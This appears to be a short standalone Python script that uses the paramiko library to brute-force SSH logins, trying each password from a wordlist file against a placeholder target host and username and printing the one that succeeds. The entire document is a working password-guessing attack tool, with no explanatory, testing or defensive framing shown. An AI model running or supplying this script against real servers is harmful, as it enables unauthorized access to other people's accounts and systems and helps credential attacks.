import paramiko

host = 'target_host'
user = 'target_username'
passwords_file = 'path/to/passwords/file'

with open(passwords_file, 'r') as f:
    passwords = f.read().splitlines()

for password in passwords:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=user, password=password)
        print(f'Successful login with password: {password}')
        ssh.close()
        break
    except:
        print(f'Login failed with password: {password}')
